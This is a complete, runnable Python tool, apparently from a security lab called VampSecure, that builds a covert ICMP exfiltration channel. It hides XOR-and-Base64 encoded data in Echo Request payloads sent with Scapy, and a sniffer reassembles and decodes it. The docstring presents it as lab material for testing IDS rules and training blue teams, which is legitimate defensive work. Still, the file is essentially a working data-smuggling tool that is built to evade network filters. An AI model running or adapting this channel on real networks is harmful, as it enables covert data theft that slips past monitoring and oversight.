#!/usr/bin/env python3
"""
vamp_icmp_shadow.py — Canal Encubierto ICMP para Red/Blue Team
==============================================================
VampSecure Labs · VampSecure Studios
Para Uso Exclusivo en Pruebas de Penetración Autorizadas — v1.2

DESCRIPCIÓN GENERAL
-------------------
Implementación de canal encubierto sobre protocolo ICMP destinada a
entornos de laboratorio Red/Blue Team. Permite demostrar que el campo
payload de paquetes ICMP Echo Request puede usarse como vector de
exfiltración de datos, eludiendo controles de red que solo filtran por
protocolo o puerto pero no inspeccionan el contenido ICMP en profundidad.

Su finalidad es exclusivamente educativa y defensiva: validar reglas IDS/IPS
(Snort, Suricata), entrenar equipos Blue Team a detectar este patrón de
tráfico y documentar el vector en informes de auditoría de red. No debe
utilizarse fuera de entornos de laboratorio propios o con autorización escrita.

ARQUITECTURA DE EJECUCIÓN (2 modos)
------------------------------------
  Modo send (emisor)
    1. El mensaje se cifra mediante XOR(clave) y se codifica en Base64.
    2. El resultado se fragmenta en chunks de CHUNK_SIZE bytes (default 200).
    3. Cada chunk se prefija con MAGIC_PREFIX ("VSHDW:") para identificación.
    4. Se envían paquetes ICMP Echo Request (type=8) con el chunk como payload.
    Clave: parámetro --key o fichero --key-file (default: VAMP_KEY_2026).

  Modo listen (receptor)
    Captura ICMP Echo Requests mediante Scapy sniff() con filtro BPF "icmp".
    Extrae el payload, verifica el prefijo VSHDW:, decodifica Base64 → XOR.
    Reensambla chunks en orden de llegada. Verbose mode para depuración.

DEPENDENCIAS
------------
  scapy    >= 2.5.0    — Captura y forja de paquetes de red (requiere root)
  rich     >= 13.7.0   — Salida de consola con formato enriquecido y tablas

AUTORÍA
-------
  © VampSecure Studios — VampSecure Labs Security Research Division
  Todos los derechos reservados. Uso exclusivo en entornos autorizados.
"""

from __future__ import annotations

import argparse
import base64
import os
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

try:
    from scapy.all import IP, ICMP, Raw, send, sniff
except ImportError:
    print("[ERROR] Instala scapy: pip install scapy", file=sys.stderr)
    sys.exit(1)

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# ────────────────────────────────────────────────────────────────────────────
# Constantes
# ────────────────────────────────────────────────────────────────────────────

VERSION = "1.2"
TOOL_NAME = "vamp-icmp-shadow"
DEFAULT_KEY = "VAMP_KEY_2026"
CHUNK_SIZE = 200   # bytes por paquete ICMP (texto ofuscado en Base64)
MAGIC_PREFIX = "VSHDW:"  # prefijo para identificar paquetes del canal

BANNER = r"""
  ____   ____    _    __  __ ____  _____ ____ _   _ ____  _____   _        _    ____ ____
 \ \ / / _  |  / \  |  \/  |  _ \/ ____/ ___| | | |  _ \| ____| | |      / \  | __ ) ___|
  \ V / (_| | / _ \ | |\/| | |_) \___ \| |___| | | | |_) |  _|   | |     / _ \ |  _ \___ \
   | |  \__, |/ ___ \| |  | |  __/ ___) |___  | |_| |  _ <| |___  | |___ / ___ \| |_) |__) |
   |_|     /_/_/   \_|_|  |_|_|   |____/\____|\___/|_| \_|_____| |_____/_/   \_|____/____/
     by VampSecure Studios · vamp-icmp-shadow v1.2 · Covert ICMP Channel for Red/Blue Team
     ───────────────────────────────────────────────────────────────────────────────────────
     USO EXCLUSIVO EN AUDITORÍAS AUTORIZADAS · El uso no autorizado es ilegal
"""

console = Console()


# ────────────────────────────────────────────────────────────────────────────
# Cifrado XOR + Base64
# ────────────────────────────────────────────────────────────────────────────

def _xor(data: bytes, key: str) -> bytes:
    """
    Aplica cifrado XOR entre los datos y la clave (se repite cíclicamente).
    Operación simétrica: XOR(XOR(data, key), key) = data.
    """
    key_bytes = key.encode()
    key_len = len(key_bytes)
    return bytes(data[i] ^ key_bytes[i % key_len] for i in range(len(data)))


def obfuscate(text: str, key: str) -> str:
    """
    Cifra texto plano con XOR(key) y codifica en Base64 para transporte.
    Añade el prefijo mágico para que el receptor identifique los paquetes.
    """
    xored = _xor(text.encode("utf-8"), key)
    b64 = base64.b64encode(xored).decode("ascii")
    return MAGIC_PREFIX + b64


def deobfuscate(payload: str, key: str) -> Optional[str]:
    """
    Extrae y descifra un payload obfuscado.
    Devuelve el texto en claro o None si no es un paquete Shadow válido.
    """
    if not payload.startswith(MAGIC_PREFIX):
        return None
    try:
        b64_part = payload[len(MAGIC_PREFIX):]
        xored = base64.b64decode(b64_part.encode("ascii"))
        clear = _xor(xored, key)
        return clear.decode("utf-8", errors="replace")
    except Exception:
        return None


# ────────────────────────────────────────────────────────────────────────────
# Modo EMISOR
# ────────────────────────────────────────────────────────────────────────────

def send_data(target: str, message: str, key: str, verbose: bool) -> None:
    """
    Envía un mensaje por el canal ICMP Shadow.

    Mensajes largos se fragmentan en chunks de CHUNK_SIZE bytes (del payload
    cifrado). Cada chunk viaja en un paquete ICMP Echo Request independiente.
    El receptor los reensambla en orden por número de secuencia.
    """
    obfuscated = obfuscate(message, key)
    chunks = [obfuscated[i:i + CHUNK_SIZE] for i in range(0, len(obfuscated), CHUNK_SIZE)]
    total = len(chunks)

    console.print(Panel(
        f"Destino:    [bold cyan]{target}[/]\n"
        f"Mensaje:    [bold]{message[:80]}{'…' if len(message) > 80 else ''}[/]\n"
        f"Clave:      [dim]{'*' * len(key)}[/]\n"
        f"Paquetes:   [yellow]{total}[/] chunk(s) de {CHUNK_SIZE} bytes",
        title=f"[bold red]ICMP Shadow v{VERSION} — Emisor[/]",
        border_style="red",
    ))

    t = Table(border_style="red")
    t.add_column("#", width=5, justify="right")
    t.add_column("Payload (Base64, truncado)", width=60)
    t.add_column("Tamaño", width=8, justify="right")
    t.add_column("Estado", width=10)

    for i, chunk in enumerate(chunks, 1):
        payload_str = chunk.encode("ascii")
        pkt = IP(dst=target) / ICMP(type=8, seq=i) / Raw(load=payload_str)
        try:
            send(pkt, verbose=False)
            status = "[green]OK[/]"
        except Exception as e:
            status = f"[red]ERROR[/]"
            if verbose:
                console.print(f"[red]Error en paquete {i}: {e}[/]")

        preview = chunk[len(MAGIC_PREFIX):len(MAGIC_PREFIX) + 50] + "…" if len(chunk) > 55 else chunk
        t.add_row(str(i), preview, str(len(payload_str)), status)
        time.sleep(0.05)  # pausa mínima para no saturar el stack de red

    console.print(t)
    console.print(f"\n[green]✔ Transmisión completada ({total} paquete(s))[/]")


# ────────────────────────────────────────────────────────────────────────────
# Modo RECEPTOR
# ────────────────────────────────────────────────────────────────────────────

class ShadowListener:
    """
    Captura paquetes ICMP Echo Request y decodifica el canal Shadow.

    Acumula chunks del mismo emisor hasta que se reconstituye el mensaje
    completo (cuando el payload no llena el CHUNK_SIZE → último fragmento).
    """

    def __init__(self, key: str, verbose: bool):
        self.key = key
        self.verbose = verbose
        self._buffer: dict[str, list[tuple[int, str]]] = {}
        self._count = 0

    def process(self, pkt) -> None:
        """Callback de Scapy para cada paquete ICMP capturado."""
        if not (pkt.haslayer(ICMP) and pkt[ICMP].type == 8 and pkt.haslayer(Raw)):
            return

        raw_payload = pkt[Raw].load.decode("ascii", errors="ignore")

        if not raw_payload.startswith(MAGIC_PREFIX):
            if self.verbose:
                console.print(f"[dim]ICMP sin prefijo Shadow: {raw_payload[:40]}[/]")
            return

        src_ip = pkt[IP].src
        seq = pkt[ICMP].seq
        self._count += 1

        # Acumular chunks por IP fuente
        if src_ip not in self._buffer:
            self._buffer[src_ip] = []
        self._buffer[src_ip].append((seq, raw_payload))

        # Decodificar directamente el chunk (sin reensamblar por ahora)
        clear = deobfuscate(raw_payload, self.key)
        ts = datetime.now().strftime("%H:%M:%S")

        if clear:
            # Intentar reconstruir si viene segmentado
            chunks = sorted(self._buffer[src_ip], key=lambda x: x[0])
            # El último chunk determina si el mensaje es completo o no
            # (simplificación: cada chunk puede ser mensaje independiente)
            console.print(Panel(
                f"[bold]IP fuente:[/] [cyan]{src_ip}[/]  "
                f"[bold]Seq:[/] {seq}  "
                f"[bold]Paquetes recibidos de esta IP:[/] {len(self._buffer[src_ip])}\n\n"
                f"[bold green]Texto en claro:[/]\n{clear}",
                title=f"[{ts}] [bold red]CAPTURA SHADOW[/]",
                border_style="red",
            ))
        else:
            if self.verbose:
                console.print(f"[dim][{ts}] Paquete Shadow pero decodificación fallida (clave incorrecta?)[/]")

    def run(self, interface: str) -> None:
        """Inicia la captura en la interfaz especificada."""
        console.print(Panel(
            f"Interfaz:   [bold]{interface}[/]\n"
            f"Clave:      [dim]{'*' * len(self.key)}[/]\n"
            f"Filtro:     ICMP Echo Request (type=8)\n"
            f"[dim]Ctrl+C para detener[/]",
            title=f"[bold red]ICMP Shadow v{VERSION} — Receptor[/]",
            border_style="red",
        ))

        try:
            sniff(
                iface=interface,
                filter="icmp",
                prn=self.process,
                store=False,
            )
        except KeyboardInterrupt:
            pass

        console.print(f"\n[bold red]Escucha finalizada.[/] Paquetes Shadow capturados: {self._count}")


# ────────────────────────────────────────────────────────────────────────────
# CLI
# ────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    """Construye el parser con subcomandos send / listen."""
    p = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description=(
            f"VampSecure Labs ICMP Shadow v{VERSION} — "
            "Canal encubierto ICMP para laboratorio Blue Team / Red Team"
        ),
        epilog="ADVERTENCIA: Solo para entornos de laboratorio autorizados. Requiere root.",
    )
    subs = p.add_subparsers(dest="mode", metavar="modo")
    subs.required = True

    # send
    s = subs.add_parser("send", help="Enviar mensaje por canal ICMP Shadow")
    s.add_argument("-t", "--target", required=True, help="IP destino")
    s.add_argument("-d", "--data", required=True, help="Mensaje a transmitir")
    s.add_argument("-k", "--key", default=DEFAULT_KEY, help="Clave XOR")
    s.add_argument("--key-file", help="Fichero con la clave XOR (primera línea)")
    s.add_argument("-v", "--verbose", action="store_true", help="Salida verbose")

    # listen
    li = subs.add_parser("listen", help="Escuchar canal ICMP Shadow entrante")
    li.add_argument("-i", "--interface", default="eth0", help="Interfaz de red")
    li.add_argument("-k", "--key", default=DEFAULT_KEY, help="Clave XOR")
    li.add_argument("--key-file", help="Fichero con la clave XOR (primera línea)")
    li.add_argument("-v", "--verbose", action="store_true", help="Salida verbose")

    return p


def _resolve_key(args) -> str:
    """Obtiene la clave XOR del fichero o parámetro --key."""
    if getattr(args, "key_file", None):
        try:
            return Path(args.key_file).read_text(encoding="utf-8").splitlines()[0].strip()
        except Exception as e:
            console.print(f"[red]Error leyendo key-file: {e}[/]")
            sys.exit(1)
    return args.key


def main() -> None:
    """Punto de entrada principal."""
    console.print(BANNER.format(version=VERSION), style="bold red")

    if os.geteuid() != 0:
        console.print("[red]ERROR: Esta herramienta requiere privilegios de root.[/]")
        sys.exit(1)

    parser = build_parser()
    args = parser.parse_args()
    key = _resolve_key(args)

    if args.mode == "send":
        send_data(
            target=args.target,
            message=args.data,
            key=key,
            verbose=args.verbose,
        )
    elif args.mode == "listen":
        listener = ShadowListener(key=key, verbose=args.verbose)
        listener.run(interface=args.interface)


if __name__ == "__main__":
    main()
